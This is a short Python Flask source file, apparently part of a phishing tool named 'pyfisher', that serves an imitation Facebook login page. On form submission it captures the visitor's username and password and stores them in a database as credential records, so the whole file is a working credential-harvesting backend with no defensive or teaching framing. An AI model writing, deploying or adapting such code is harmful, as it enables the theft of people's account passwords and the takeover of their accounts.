from pyfisher import *
from flask import request, render_template
from models import *

@app.route('/', methods=['POST', 'GET'])
def facebook_page():
    if request.method == 'POST':
        username = request.form.get("username")
        password = request.form.get("password")
        cred = Credential(username=username, password=password)
        db.session.add(cred)
        db.session.commit()
    else:
        pass
    return render_template("facebook.html")
